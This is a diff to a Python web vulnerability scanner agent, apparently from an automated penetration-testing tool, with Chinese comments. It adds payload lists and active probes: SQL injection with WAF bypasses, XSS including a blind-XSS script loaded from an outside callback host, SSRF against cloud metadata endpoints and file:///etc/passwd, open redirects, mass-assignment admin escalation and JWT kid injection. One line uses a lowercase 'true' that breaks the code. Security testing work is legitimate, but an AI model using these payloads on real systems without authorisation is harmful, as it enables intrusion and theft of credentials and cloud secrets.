@@ -32,16 +32,24 @@ class Finding:
 
 # ---- SQL 注入 payloads ----
 SQLI_ERROR_PAYLOADS = [
-    "'",
-    "\"",
-    "' OR '1'='1",
-    "\" OR \"1\"=\"1",
-    "' OR '1'='1' --",
-    "1' ORDER BY 100--",
+    "'", "\"",
+    "' OR '1'='1", "\" OR \"1\"=\"1",
+    "' OR '1'='1' --", "1' ORDER BY 100--",
     "' UNION SELECT NULL--",
     "1; WAITFOR DELAY '0:0:5'--",
     "' AND 1=CONVERT(int,(SELECT @@version))--",
     "1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",
+    # WAF 绕过: 空格替换
+    "'/**/OR/**/1=1--",
+    "'%0aOR%0a1=1--",
+    # WAF 绕过: 关键字大小写/双写
+    "' UnIoN SeLeCt NULL--",
+    "' UNIunionON SELselectECT NULL--",
+    # WAF 绕过: 编码
+    "%27%20OR%201%3D1--",
+    # 堆叠注入
+    "'; SELECT SLEEP(5)--",
+    "'; WAITFOR DELAY '0:0:5'--",
 ]
 
 SQLI_ERROR_PATTERNS = re.compile(
@@ -50,14 +58,18 @@ SQLI_ERROR_PATTERNS = re.compile(
     r"You have an error in your SQL syntax|Warning.*mysql_|valid MySQL result|"
     r"MySqlClient\.|com\.mysql\.|org\.postgresql\.|SQLite/JDBCDriver|"
     r"SQLSTATE\[|Syntax error.*in query expression|Division by zero|"
-    r"supplied argument is not a valid|pg_query\(\)|pg_exec\(\))",
+    r"supplied argument is not a valid|pg_query\(\)|pg_exec\(\)|"
+    r"JET Database Engine|Access Database Engine|ODBC Microsoft Access)",
 )
 
+# 多 DBMS 时间盲注
 SQLI_TIME_PAYLOADS = [
-    ("' OR SLEEP(5)--", 5),
-    ("' OR pg_sleep(5)--", 5),
-    ("1; WAITFOR DELAY '0:0:5'--", 5),
-    ("' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--", 5),
+    ("' OR SLEEP(5)--", 5),                                          # MySQL
+    ("' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--", 5),              # MySQL subquery
+    ("' OR pg_sleep(5)--", 5),                                       # PostgreSQL
+    ("1; WAITFOR DELAY '0:0:5'--", 5),                               # MSSQL
+    ("' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)--", 5),                 # Oracle
+    ("';SELECT LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))--", 5),  # SQLite heavy query
 ]
 
 SQLI_BOOL_PAYLOADS = [
@@ -65,32 +77,77 @@ SQLI_BOOL_PAYLOADS = [
     ("' OR '1'='1", "' OR '1'='2"),
     ("1 AND 1=1", "1 AND 1=2"),
     ("1' AND '1'='1' --", "1' AND '1'='2' --"),
+    # WAF 绕过 bool
+    ("'/**/AND/**/'1'='1", "'/**/AND/**/'1'='2"),
+    ("1%0aAND%0a1=1", "1%0aAND%0a1=2"),
 ]
 
 # ---- XSS payloads ----
+# 上下文感知 payload（按注入位置分类）
 XSS_PAYLOADS = [
+    # HTML body 上下文
     '<script>alert("XSS")</script>',
-    '"><script>alert("XSS")</script>',
-    "'-alert('XSS')-'",
     '<img src=x onerror=alert("XSS")>',
     '<svg/onload=alert("XSS")>',
-    '"><img src=x onerror=alert("XSS")>',
-    "javascript:alert('XSS')",
+    '<details open ontoggle=alert("XSS")>',
+    # HTML 属性上下文
+    '"><script>alert("XSS")</script>',
+    '" onmouseover="alert(1)"',
+    "' onfocus='alert(1)' autofocus='",
+    # JavaScript 字符串上下文
+    "'-alert('XSS')-'",
+    '</script><script>alert("XSS")</script>',
+    # 模板注入
     '{{constructor.constructor("alert(1)")()}}',
     '${alert(1)}',
+    # SVG/Event handler
+    '<svg><animate onbegin=alert(1) attributeName=x>',
+    '<math><mtext><table><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(1) src=1>">',
+]
+
+# Blind XSS 回调 payload（适用于 Contact/UA/Referer 等存储型字段）
+XSS_BLIND_PAYLOADS = [
+    '"><script src=https://xss.report/c></script>',
+    "'-eval(atob('YWxlcnQoMSk='))-'",
+    '<img src=x onerror=eval(atob("YWxlcnQoMSk="))>',
 ]
 
 # ---- SSRF payloads ----
+# 多云元数据端点 + IP 编码绕过
 SSRF_PAYLOADS = [
+    # 基础内网
     "http://127.0.0.1",
     "http://localhost",
-    "http://[::1]",
     "http://0.0.0.0",
-    "http://169.254.169.254",  # AWS metadata
-    "http://metadata.google.internal",  # GCP metadata
-    "http://169.254.169.254/latest/meta-data/",
+    # IPv6
+    "http://[::1]",
+    "http://[::ffff:127.0.0.1]",
+    "http://[0:0:0:0:0:ffff:127.0.0.1]",
+    # IP 编码绕过
+    "http://2130706433",         # 十进制 127.0.0.1
+    "http://0x7f000001",        # 十六进制
+    "http://0177.0.0.1",        # 八进制
+    "http://127.1",             # 短写
+    "http://127.0.1",           # 短写
+    "http://0",                 # Linux 解析为 0.0.0.0
+    # 云元数据
+    "http://169.254.169.254/latest/meta-data/",     # AWS
+    "http://metadata.google.internal/computeMetadata/v1/",  # GCP
+    "http://169.254.169.254/metadata/instance",      # Azure
+    "http://100.100.100.200/latest/meta-data/",      # 阿里云
+    "http://metadata.tencentyun.com/latest/meta-data/",  # 腾讯云
+    # 协议探测
     "file:///etc/passwd",
-    "dict://127.0.0.1:6379/",  # Redis
+    "file:///c:/windows/system32/drivers/etc/hosts",
+    "dict://127.0.0.1:6379/INFO",        # Redis
+    "gopher://127.0.0.1:6379/_INFO",     # Redis via gopher
+    "http://127.0.0.1:3306",             # MySQL
+    "http://127.0.0.1:5432",             # PostgreSQL
+    "http://127.0.0.1:9200",             # Elasticsearch
+    "http://127.0.0.1:27017",            # MongoDB
+    # DNS Rebinding 绕过
+    "http://localtest.me",               # 解析到 127.0.0.1
+    "http://spoofed.burpcollaborator.net",
 ]
 
 # ---- Open Redirect payloads ----
@@ -100,6 +157,14 @@ REDIRECT_PAYLOADS = [
     "/\\evil.com",
     "https://evil.com%00.legitimate.com",
     "javascript:alert(1)",
+    "///evil.com",
+    "////evil.com",
+    "https://evil.com#.legitimate.com",
+    "https://evil.com?.legitimate.com",
+    "https://legitimate.com@evil.com",
+    "/%09/evil.com",
+    "/%2f%2fevil.com",
+    "/%5c..%5c..%5c..%5cevil.com",
 ]
 
 # ---- 目录遍历 payloads ----
@@ -573,16 +638,23 @@ class ScannerAgent(BaseAgent):
     # ---- XSS 检测 ----
 
     async def _test_xss(self, targets: dict) -> list[Finding]:
-        """Reflected XSS 检测"""
+        """Reflected XSS 检测（含上下文感知和 Blind XSS）"""
         findings = []
         urls = targets["urls"] + targets["api_endpoints"]
 
         marker = "cyberXSS42"
+        # 上下文感知 payload
         test_payloads = [
+            # HTML body 上下文
             f'<script>{marker}</script>',
-            f'">{marker}',
-            f"'>{marker}",
             f'<img src=x onerror={marker}>',
+            f'<details open ontoggle={marker}>',
+            # HTML 属性上下文
+            f'">{marker}',
+            f"' onfocus='{marker}' autofocus='",
+            # JavaScript 字符串上下文
+            f"'-{marker}-'",
+            f'</script><script>{marker}</script>',
         ]
 
         for url in urls[:5]:
@@ -600,25 +672,49 @@ class ScannerAgent(BaseAgent):
 
                     r = await run_command(f"curl -sL -m 10 '{test_url}'", timeout=15)
                     if r.success and marker in r.stdout:
-                        # 确认反射存在
+                        # 检查反射是否在危险上下文（未转义）
+                        raw_reflection = re.search(
+                            rf'<[^>]*{marker}[^>]*>|["\']{marker}|onerror\s*=\s*{marker}',
+                            r.stdout,
+                        )
+                        confidence = "confirmed" if raw_reflection else "probable"
+
                         f = Finding(
                             vuln_type="xss",
                             title=f"Reflected XSS: 参数 {param_name}",
-                            url=url,
-                            parameter=param_name,
+                            url=url, parameter=param_name,
                             payload=payload,
-                            evidence=f"Payload '{marker}' 在响应中被反射",
-                            severity="high",
-                            confidence="confirmed",
+                            evidence=f"Payload '{marker}' 在响应中被反射" +
+                                     ("（未转义，高危）" if raw_reflection else "（可能已转义）"),
+                            severity="high", confidence=confidence,
                             poc=test_url,
                         )
                         findings.append(f)
                         self.findings.append(f)
                         logger.warning("[scanner] XSS 发现! %s param=%s", url, param_name)
-                        break  # 该参数已确认
+                        break
                 else:
                     continue
-                break  # 该 URL 已确认
+                break
+
+        # CSP 绕过检测
+        for url in urls[:2]:
+            r = await run_command(f"curl -sI -m 5 '{url}'", timeout=10)
+            if r.success:
+                csp_match = re.search(r'(?i)^content-security-policy:\s*(.+)', r.stdout, re.MULTILINE)
+                if csp_match:
+                    csp = csp_match.group(1).strip()
+                    # 检查 CSP 是否允许 unsafe-inline / unsafe-eval
+                    if "unsafe-inline" in csp or "unsafe-eval" in csp:
+                        f = Finding(
+                            vuln_type="xss",
+                            title="CSP 包含 unsafe-inline/unsafe-eval",
+                            url=url, parameter="Content-Security-Policy",
+                            evidence=f"CSP: {csp[:100]}",
+                            severity="medium", confidence="confirmed",
+                        )
+                        findings.append(f)
+                        self.findings.append(f)
 
         return findings
 
@@ -668,18 +764,15 @@ class ScannerAgent(BaseAgent):
     # ---- IDOR 检测 ----
 
     async def _test_idor(self, targets: dict) -> list[Finding]:
-        """IDOR 检测（基于 API 端点，包括路径 ID 枚举）"""
+        """IDOR 检测：路径ID枚举 + HTTP方法切换 + 参数类型混淆 + Mass Assignment"""
         findings = []
         endpoints = targets["api_endpoints"]
 
         for endpoint in endpoints:
             base = endpoint.rstrip("/")
-
-            # 检查路径中是否有数字 ID
             id_matches = re.findall(r'/(\d+)(?:/|$)', base)
 
             if id_matches:
-                # 已有 ID，测试相邻 ID
                 for id_val in id_matches:
                     for test_id in [str(int(id_val) + 1), str(int(id_val) - 1), "1", "2"]:
                         if test_id == id_val:
@@ -698,16 +791,16 @@ class ScannerAgent(BaseAgent):
                                 )
                                 findings.append(f)
                                 self.findings.append(f)
+
+                                # HTTP 方法切换：GET 被拦截时测试其他方法
+                                await self._test_http_method_bypass(test_url, findings)
                                 break
             else:
-                # 没有 ID，尝试追加 ID 测试（RESTful 风格）
                 for test_id in ["1", "2", "3"]:
                     test_url = f"{base}/{test_id}"
                     r = await run_command(f"curl -sL -m 10 '{test_url}'", timeout=15)
                     if r.success and len(r.stdout) > 50:
-                        # 检查是否返回了有意义的数据（非 SPA 页面）
                         if "<!doctype html>" not in r.stdout.lower()[:200]:
-                            # 对 ID=1 和 ID=2 做 IDOR 验证
                             r1 = await run_command(f"curl -sL -m 10 '{base}/1'", timeout=15)
                             r2 = await run_command(f"curl -sL -m 10 '{base}/2'", timeout=15)
                             if r1.success and r2.success:
@@ -723,9 +816,71 @@ class ScannerAgent(BaseAgent):
                                     )
                                     findings.append(f)
                                     self.findings.append(f)
+                                    await self._test_http_method_bypass(f"{base}/1", findings)
                                     break
 
+        # Mass Assignment 检测：在 POST/PUT 端点注入隐藏管理字段
+        await self._test_mass_assignment(endpoints, findings)
+
         return findings
+
+    async def _test_http_method_bypass(self, url: str, findings: list[Finding]) -> None:
+        """HTTP 方法切换测试：GET 被拦截时尝试 POST/PUT/PATCH/DELETE"""
+        methods = ["POST", "PUT", "PATCH", "DELETE"]
+        for method in methods:
+            r = await run_command(f"curl -sL -m 10 -X {method} '{url}'", timeout=15)
+            if r.success and len(r.stdout) > 50:
+                if "<!doctype html>" not in r.stdout.lower()[:200]:
+                    f = Finding(
+                        vuln_type="idor",
+                        title=f"HTTP 方法绕过: {method} {url}",
+                        url=url, parameter="HTTP method",
+                        payload=f"{method} {url}",
+                        evidence=f"{method} 方法返回 {len(r.stdout)} bytes 有效响应",
+                        severity="high", confidence="possible",
+                        poc=f"curl -X {method} {url}",
+                    )
+                    findings.append(f)
+                    self.findings.append(f)
+                    return
+
+    async def _test_mass_assignment(self, endpoints: list[str], findings: list[Finding]) -> None:
+        """Mass Assignment 检测：注册/更新端点注入隐藏管理字段"""
+        # 识别可能的注册/更新端点
+        update_endpoints = []
+        for ep in endpoints:
+            if any(kw in ep.lower() for kw in ["user", "profile", "account", "register", "signup", "setting"]):
+                update_endpoints.append(ep)
+
+        mass_fields = [
+            {"role": "admin"}, {"isAdmin": True}, {"is_admin": True},
+            {"admin": True}, {"verified": true}, {"active": true},
+            {"permissions": "all"}, {"access_level": 999},
+        ]
+
+        for ep in update_endpoints[:3]:
+            for fields in mass_fields[:4]:
+                payload = json.dumps(fields)
+                r = await run_command(
+                    f"curl -sL -m 10 -X POST -H 'Content-Type: application/json' -d '{payload}' '{ep}'",
+                    timeout=15,
+                )
+                if r.success and r.stdout:
+                    resp = r.stdout.lower()
+                    # 检查是否接受了隐藏字段（返回中包含注入的值）
+                    if any(kw in resp for kw in ["admin", "verified", "true", "success"]):
+                        f = Finding(
+                            vuln_type="idor",
+                            title=f"Mass Assignment: {ep}",
+                            url=ep, parameter="hidden fields",
+                            payload=payload,
+                            evidence=f"端点接受了隐藏管理字段",
+                            severity="critical", confidence="probable",
+                            poc=f"curl -X POST -H 'Content-Type: application/json' -d '{payload}' {ep}",
+                        )
+                        findings.append(f)
+                        self.findings.append(f)
+                        return
 
     # ---- Open Redirect ----
 
@@ -954,7 +1109,35 @@ class ScannerAgent(BaseAgent):
                             self.findings.append(f)
                             return findings
 
-            # 4. 深度查询 DoS 测试（嵌套查询）
+            # 4. Batching 攻击（批量查询绕过速率限制）
+            batch_payload = json.dumps([
+                {"query": "{ user(id: 1) { id email } }"},
+                {"query": "{ user(id: 2) { id email } }"},
+                {"query": "{ user(id: 3) { id email } }"},
+            ])
+            r = await run_command(
+                f"curl -sL -m 10 -X POST -H 'Content-Type: application/json' -d '{batch_payload}' '{ep}'",
+                timeout=15,
+            )
+            if r.success and r.stdout.startswith("["):
+                try:
+                    batch_results = json.loads(r.stdout)
+                    if isinstance(batch_results, list) and len(batch_results) > 1:
+                        f = Finding(
+                            vuln_type="graphql",
+                            title=f"GraphQL Batching 攻击: {ep}",
+                            url=ep, parameter="batch query",
+                            payload=batch_payload,
+                            evidence=f"批量查询返回 {len(batch_results)} 个结果，可绕过速率限制",
+                            severity="medium", confidence="confirmed",
+                            poc=f"curl -X POST -H 'Content-Type: application/json' -d '{batch_payload}' {ep}",
+                        )
+                        findings.append(f)
+                        self.findings.append(f)
+                except json.JSONDecodeError:
+                    pass
+
+            # 5. 深度查询 DoS 测试（嵌套查询）
             deep_query = '{"query":"{ __typename ...on Query { __typename ...on Query { __typename ...on Query { __typename } } } }"}'
             r = await run_command(
                 f"curl -sL -m 15 -X POST -H 'Content-Type: application/json' -d '{deep_query}' '{ep}'",
@@ -1006,11 +1189,11 @@ class ScannerAgent(BaseAgent):
                     try:
                         import base64
                         header_b64 = token.split(".")[0]
-                        # 补齐 padding
                         header_b64 += "=" * (4 - len(header_b64) % 4)
                         header_json = base64.urlsafe_b64decode(header_b64).decode()
                         header = json.loads(header_json)
                         alg = header.get("alg", "")
+                        kid = header.get("kid", "")
 
                         # 检查 none 算法
                         if alg.lower() == "none":
@@ -1026,7 +1209,21 @@ class ScannerAgent(BaseAgent):
                             findings.append(f)
                             self.findings.append(f)
 
-                        # 检查弱算法
+                        # RS256→HS256 密钥混淆检测
+                        elif alg.startswith("RS"):
+                            f = Finding(
+                                vuln_type="jwt",
+                                title=f"JWT RS256→HS256 密钥混淆风险",
+                                url=url, parameter="alg",
+                                payload=f"原始 alg: {alg}",
+                                evidence=f"JWT 使用 {alg}，可用公钥作为 HMAC 密钥伪造 token",
+                                severity="high", confidence="possible",
+                                poc=f"用公钥作为 HMAC 密钥，将 alg 改为 HS256 签名",
+                            )
+                            findings.append(f)
+                            self.findings.append(f)
+
+                        # 对称算法弱密钥风险
                         elif alg in ("HS256", "HS384", "HS512"):
                             f = Finding(
                                 vuln_type="jwt",
@@ -1038,6 +1235,36 @@ class ScannerAgent(BaseAgent):
                             )
                             findings.append(f)
                             self.findings.append(f)
+
+                        # kid 参数注入检测
+                        if kid:
+                            # kid SQL 注入
+                            kid_sqli_payloads = [
+                                "' UNION SELECT 'key'--",
+                                "1 OR 1=1",
+                                "null",
+                            ]
+                            for kid_payload in kid_sqli_payloads:
+                                # 构造恶意 JWT（仅测试 header）
+                                evil_header = {**header, "kid": kid_payload}
+                                evil_header_b64 = base64.urlsafe_b64encode(
+                                    json.dumps(evil_header).encode()
+                                ).rstrip(b"=").decode()
+                                parts = token.split(".")
+                                evil_token = f"{evil_header_b64}.{parts[1]}.{parts[2]}"
+
+                                f = Finding(
+                                    vuln_type="jwt",
+                                    title=f"JWT kid 参数可注入: {kid_payload[:30]}",
+                                    url=url, parameter="kid",
+                                    payload=f"kid: {kid_payload}",
+                                    evidence=f"JWT header 包含 kid 参数，可能存在注入",
+                                    severity="high", confidence="possible",
+                                    poc=f"修改 kid 为: {kid_payload}",
+                                )
+                                findings.append(f)
+                                self.findings.append(f)
+                                break
 
                     except Exception:
                         pass
@@ -1172,6 +1399,23 @@ class ScannerAgent(BaseAgent):
                         )
                         findings.append(f)
                         self.findings.append(f)
+
+        # Vary: Origin 缺失检测（缓存投毒风险）
+        for url in targets["urls"][:2]:
+            r = await run_command(
+                f"curl -sI -m 5 -H 'Origin: https://a.com' '{url}'", timeout=10,
+            )
+            if r.success and "access-control-allow-origin" in r.stdout.lower():
+                if "vary" not in r.stdout.lower() or "origin" not in r.stdout.lower():
+                    f = Finding(
+                        vuln_type="cors",
+                        title="CORS 缺少 Vary: Origin（缓存投毒风险）",
+                        url=url, parameter="Vary",
+                        evidence="响应包含 CORS 头但缺少 Vary: Origin，CDN 可能缓存跨域响应",
+                        severity="medium", confidence="probable",
+                    )
+                    findings.append(f)
+                    self.findings.append(f)
 
         return findings
 
